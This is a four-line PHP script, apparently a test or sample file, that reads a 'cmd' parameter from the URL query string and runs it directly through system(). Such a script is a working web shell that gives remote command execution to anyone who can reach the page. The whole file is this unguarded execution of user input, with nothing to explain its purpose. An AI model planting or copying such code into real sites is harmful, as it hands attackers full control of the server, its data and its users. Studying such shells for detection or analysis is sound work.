<?php declare(strict_types = 1);

$cmd = $_GET['cmd'] ?? 'whoami';
var_dump(system($cmd));
